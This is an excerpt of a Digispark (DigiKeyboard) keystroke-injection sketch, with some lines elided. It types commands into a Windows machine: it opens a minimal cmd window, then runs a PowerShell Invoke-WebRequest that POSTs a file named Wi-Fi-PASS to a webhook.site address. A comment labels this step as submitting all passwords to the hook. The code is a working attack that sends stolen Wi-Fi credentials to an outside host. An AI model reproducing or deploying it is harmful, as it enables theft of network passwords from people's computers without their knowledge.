...
void loop() {
  ...
  DigiKeyboard.println("cmd /k mode"); //smallest cmd window possible
  ...
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/YOUR_KEY -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
